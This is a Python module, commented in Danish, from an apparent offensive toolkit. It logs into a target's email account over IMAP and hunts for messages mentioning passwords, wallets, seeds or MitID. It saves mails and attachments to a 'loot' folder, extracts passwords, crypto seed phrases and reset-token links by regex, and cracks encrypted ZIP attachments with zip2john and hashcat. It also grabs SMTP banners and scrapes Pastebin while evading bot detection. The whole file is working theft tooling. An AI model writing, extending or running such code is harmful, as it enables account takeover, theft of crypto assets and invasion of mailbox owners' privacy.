# -*- coding: utf-8 -*-
import os
import imaplib
import email
import json
import re
import zipfile
import asyncio
import socket
import dns.resolver
from email.header import decode_header
from email.utils import parsedate_to_datetime
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List

from core.base_module import BaseModule, ModuleCategory
from core.browser import OmniHunterBrowser, BrowserConfig
from core.utils import C, session

class GoliathMailRipper(BaseModule):
    """
    [09] GOLIATH MAILRIP & BREACH INTELLIGENCE
    Avanceret modul til IMAP/SMTP udvinding og WAF-bypassing mod Breach databaser.
    """
    def __init__(self):
        super().__init__()
        self.name = "MailRip & Breach Intelligence"
        self.description = "Dybdegående email-efterforskning med IMAP/SMTP, UTF-8 parsing, og WAF-bypassing mod leak-sites."
        self.category = ModuleCategory.FINANCE # Eller PERSON
        
        # Init datastruktur til Goliath format
        self.data = {
            "Mål": "",
            "IMAP_Server": "",
            "Mails_Ripped": 0,
            "Vedhæftninger_Downloadet": 0,
            "Ekstraherede_Secrets": [],
            "Krypto_Seeds": [],
            "High_Value_Links": [],
            "Breach_Data": [],
            "SMTP_Infrastruktur": {},
            "Knækkede_Passwords_Klartekst": [],
            "Timestamp": datetime.now().isoformat()
        }
        self.encrypted_archives = []

    def _detect_imap_host(self, email_addr: str) -> str:
        """Finder automatisk den rigtige server baseret på domænet"""
        domain = email_addr.split('@')[-1].lower()
        if "gmail.com" in domain: return "imap.gmail.com"
        elif "yahoo" in domain: return "imap.mail.yahoo.com"
        elif "icloud.com" in domain or "mac.com" in domain or "me.com" in domain: return "imap.mail.me.com"
        elif "protonmail" in domain: return "127.0.0.1" # Kræver lokal bridge
        else: return "imap-mail.outlook.com"

    def _enum_smtp_stealth(self, domain: str) -> Dict[str, str]:
        """Udfører stealth SMTP banner grabbing via MX records."""
        self._log(f"Enumrerer SMTP infrastruktur for domæne: {domain}...")
        smtp_data = {}
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            for mx in mx_records:
                mx_host = str(mx.exchange).rstrip('.')
                smtp_data[mx_host] = "N/A"
                try:
                    # Stealth socket connection (Timeout 2 sec for OPSEC)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    sock.connect((mx_host, 25))
                    banner = sock.recv(1024).decode(errors='ignore').strip()
                    smtp_data[mx_host] = banner
                    sock.close()
                except Exception:
                    pass
        except Exception as e:
            self._log(f"Kunne ikke slå MX op: {e}", C.RED)
        return smtp_data

    def _scrape_breach_portal(self, email_addr: str):
        """Bruger core.browser Playwright engine til at bypasse WAF på breach søgninger."""
        self._log(f"Engagerer Browser Engine for at scrape breach intel for {email_addr}...", C.YELLOW)
        
        config = BrowserConfig(
            headless=True,
            browser_type="chromium",
            anti_detection=True,
            network_capture=True, # Vi napper API kald!
            network_capture_dir=os.path.join(session.get("loot_folder", "loot_evidence"), "network_captures")
        )
        hunter = OmniHunterBrowser(config)
        hunter.start()
        
        try:
            # Simuleret dork / WAF bypass mod paste sites
            url = f"https://pastebin.com/search?q={email_addr}"
            result = hunter.fetch(url)
            
            # Bruger browserens indbyggede OSINT ekstraktor
            extracted_emails = result.get("osint", {}).get("emails", [])
            if extracted_emails:
                self.data["Breach_Data"].append({
                    "Kilde": url,
                    "Relaterede_Emails_Fundet_Paa_Siden": list(extracted_emails)
                })
            self._log("Breach data scraped succesfuldt.", C.GREEN)
            
        except Exception as e:
            self._log(f"Breach scraping fejlede: {e}", C.RED)
        finally:
            hunter.close()

    def _rip_folder_smart(self, mail, folder: str, save_dir: str):
        try:
            status, _ = mail.select(f'"{folder}"', readonly=True)
            if status != 'OK': return
        except Exception:
            return

        keywords = ["password", "kode", "adgangskode", "wallet", "seed", "krypto", "login", "faktura", "invoice", "nemid", "mitid"]
        found_ids = set()
        
        self._log(f"Udfører Server-Side High-Value Keyword Search i {folder}...")
        
        for kw in keywords:
            status, messages = mail.search(None, f'BODY "{kw}"')
            if status == 'OK' and messages[0]:
                for num in messages[0].split():
                    found_ids.add(num)
                    
        if found_ids:
            self._log(f"🔥 Fandt {len(found_ids)} høj-værdi mails i {folder}. Downloader...", C.GREEN)
            for num in found_ids:
                try:
                    _, data = mail.fetch(num, '(RFC822)')
                    msg = email.message_from_bytes(data[0][1])
                    self._save_content(msg, folder, num.decode(), save_dir)
                    self.data["Mails_Ripped"] += 1
                except Exception as e:
                    self._log(f"[-] Kunne ikke downloade mail ID {num.decode()}: {e}", C.DIM)

    def _save_content(self, msg, folder: str, mid: str, save_dir: str):
        subject_header = msg.get("Subject", "Ingen_emne")
        decoded_header = decode_header(subject_header)[0]
        subject, encoding = decoded_header
        if isinstance(subject, bytes): 
            subject = subject.decode(encoding or "utf-8", errors="ignore")
        
        date_str = msg.get("Date")
        try:
            dt = parsedate_to_datetime(date_str)
            date_prefix = dt.strftime("%Y%m%d_%H%M")
        except Exception:
            date_prefix = "00000000_0000"

        safe_subject = "".join([c for c in str(subject) if c.isalnum() or c in (' ', '_')]).rstrip()
        folder_path = os.path.join(save_dir, folder.replace("/", "_"))
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, f"{date_prefix}_{mid}_{safe_subject[:50]}.txt")
        
        full_text_content = ""
        
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(f"Fra: {msg.get('From')}\nEmne: {subject}\nDato: {msg.get('Date')}\n{'-'*50}\n")
            
            if msg.is_multipart():
                for part in msg.walk():
                    content_type = part.get_content_type()
                    content_disposition = str(part.get("Content-Disposition"))
                    
                    if content_type == "text/plain" and "attachment" not in content_disposition:
                        payload = part.get_payload(decode=True)
                        if payload:
                            text = payload.decode("utf-8", errors="ignore")
                            f.write(text)
                            full_text_content += text + "\n"
                            
                    elif part.get_filename():
                        filename = part.get_filename()
                        safe_filename = "".join([c for c in filename if c.isalnum() or c in ('.', '_', '-')])
                        attach_dir = os.path.join(folder_path, "attachments")
                        os.makedirs(attach_dir, exist_ok=True)
                        
                        try:
                            with open(os.path.join(attach_dir, f"{mid}_{safe_filename}"), "wb") as af:
                                af.write(part.get_payload(decode=True))
                            self.data["Vedhæftninger_Downloadet"] += 1
                            
                            # NYT V48: ZIP Encryption Heuristic Detection
                            if safe_filename.lower().endswith('.zip'):
                                try:
                                    with zipfile.ZipFile(os.path.join(attach_dir, f"{mid}_{safe_filename}")) as zf:
                                        for zinfo in zf.infolist():
                                            if zinfo.flag_bits & 0x1:
                                                self.encrypted_archives.append(os.path.join(attach_dir, f"{mid}_{safe_filename}"))
                                                break
                                except Exception: pass
                        except Exception: pass
            else:
                payload = msg.get_payload(decode=True)
                if payload:
                    text = payload.decode("utf-8", errors="ignore")
                    f.write(text)
                    full_text_content += text

        if full_text_content:
            self._extract_secrets(full_text_content, subject)

    def _extract_secrets(self, text: str, source_subject: str):
        pwd_matches = re.findall(r'(?i)(?:password|kode|adgangskode|pass|pwd)[\s:=]+([^\s<>"\'/]{5,30})', text)
        for pwd in pwd_matches:
            if pwd.lower() not in ["forgot", "reset", "klik", "click", "her", "here"] and pwd not in self.data["Ekstraherede_Secrets"]:
                self.data["Ekstraherede_Secrets"].append(pwd)
                self._log(f"✓ Muligt kodeord udtrækket: {pwd[:3]}*** (Fra: {source_subject[:20]})", C.MAGENTA)

        mnemonic = re.findall(r'\b(?:[a-z]{3,12}\s){11,23}[a-z]{3,12}\b', text.lower())
        for seed in mnemonic:
            if seed not in self.data["Krypto_Seeds"]:
                self.data["Krypto_Seeds"].append(seed)
                self._log(f"🔥 KRYPTO SEED FUNDET I MAIL: {source_subject[:30]}", C.RED)

        links = re.findall(r'https?://[^\s<>"\']+', text)
        for link in links:
            if any(x in link.lower() for x in ["reset", "token=", "invite", "share", "onedrive", "dropbox"]):
                if link not in self.data["High_Value_Links"]:
                    self.data["High_Value_Links"].append(link)
                    
    async def _crack_encrypted_archives(self):
        if not self.encrypted_archives: return
        self._log(f"Starter asynkron de-hashing af {len(self.encrypted_archives)} krypterede ZIP-arkiver...", C.YELLOW)
        
        for arch in self.encrypted_archives:
            try:
                # 1. Udtræk hash via zip2john
                proc = await asyncio.create_subprocess_exec("zip2john", arch, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                stdout, stderr = await proc.communicate()
                hash_line = stdout.decode().strip()
                if not hash_line: continue
                
                raw_hash = hash_line.split(":", 1)[1] if ":" in hash_line else hash_line
                self._log(f"Krypteret hash udtrukket for {os.path.basename(arch)}! Kører Hashcat...", C.MAGENTA)
                
                import tempfile
                with tempfile.NamedTemporaryFile(mode='w+', delete=False) as f:
                    f.write(f"{raw_hash}\n")
                    tmp_name = f.name
                
                # 2. Crack via Hashcat
                wordlist = "/usr/share/wordlists/rockyou.txt"
                cmd = ["hashcat", "-m", "13600", "-a", "0", tmp_name, wordlist, "--quiet", "--potfile-disable"]
                if not os.path.exists(wordlist):
                    cmd = ["hashcat", "-m", "13600", "-a", "3", tmp_name, "?l?l?l?l?l?l?d?d", "--quiet", "--potfile-disable"]
                    
                hc_proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                hc_stdout, hc_stderr = await hc_proc.communicate()
                
                for line in hc_stdout.decode().splitlines():
                    if ":" in line:
                        h, p = line.rsplit(":", 1)
                        # Formatér så det passer til datalake/UI tabeller
                        self.data["Knækkede_Passwords_Klartekst"].append({"Hash": f"ZIP_{os.path.basename(arch)}", "Cleartext": p.strip()})
                        self.data["Ekstraherede_Secrets"].append(f"ZIP_PASSWORD[{os.path.basename(arch)}]: {p.strip()}")
                        self._log(f"💥 ZIP KNÆKKET: {os.path.basename(arch)} -> {p.strip()}", C.GREEN)
                        
                os.unlink(tmp_name)
            except FileNotFoundError:
                self._log("Mangler 'zip2john' eller 'hashcat'. Kør: sudo apt install john hashcat", C.RED)
            except Exception as e:
                self._log(f"ZIP De-hash fejl: {e}", C.DIM)

    def run(self, driver: Any = None, target: str = "") -> Dict[str, Any]:
        self._log(f"[{self.name}] Initiated for Target: {target}")
        
        if not target or "@" not in target:
            self._log("Ugyldigt mål. Format skal være: email@domain.com|app_password (eller bare email)", C.RED)
            return self.data
            
        parts = target.split('|')
        email_addr = parts[0].strip().lower()
        pwd = parts[1].replace(" ", "") if len(parts) > 1 else None
        
        self.data["Mål"] = email_addr
        
        # 1. SMTP Infrastruktur Scrape
        domain = email_addr.split('@')[-1]
        self.data["SMTP_Infrastruktur"] = self._enum_smtp_stealth(domain)
        
        # 2. Asynkron WAF Bypass via Browser Engine
        self._scrape_breach_portal(email_addr)
        
        # 3. IMAP Rip (Hvis credentials er leveret)
        if pwd:
            host = self._detect_imap_host(email_addr)
            self.data["IMAP_Server"] = host
            base_dir = session.get("loot_folder", "./loot_evidence")
            save_dir = os.path.join(base_dir, f"09_MAILRIP_{email_addr.split('@')[0]}")
            os.makedirs(save_dir, exist_ok=True)
            
            self._log(f"Forbinder til {email_addr} via {host}...", C.YELLOW)
            
            try:
                mail = imaplib.IMAP4_SSL(host)
                mail.login(email_addr, pwd)
                self._log("IMAP Login Succesfuldt!", C.GREEN)
                
                status, folders = mail.list()
                if status == 'OK':
                    for f in folders:
                        f_name = f.decode().split(' "/" ')[-1].strip('"')
                        if "All Mail" in f_name or "Important" in f_name or "Starred" in f_name:
                            continue
                            
                        self._log(f"Ripper mappe: {f_name}", C.YELLOW)
                        self._rip_folder_smart(mail, f_name, save_dir)
                        
                mail.logout()
                self._log(f"RIP COMPLETE. Data gemt i: {save_dir}", C.GREEN)
                
            except Exception as e:
                self._log(f"IMAP Fejl: {e}", C.RED)
        else:
            self._log("Ingen adgangskode angivet (Mangler '|password'). Skipper IMAP extraction.", C.YELLOW)
            
        # 4. Asynkron ZIP Cracking (Hvis vedhæftede filer er krypterede)
        if self.encrypted_archives:
            try:
                loop = asyncio.get_event_loop()
                if not loop.is_running():
                    loop.run_until_complete(self._crack_encrypted_archives())
            except Exception as e: self._log(f"Fejl ved async ZIP crack: {e}", C.RED)
            
        # Gem til datalake via base_module funktionen
        self.save_to_loot(f"09_MAILRIP_{email_addr.replace('@', '_at_')}.json")
        
        return self.data
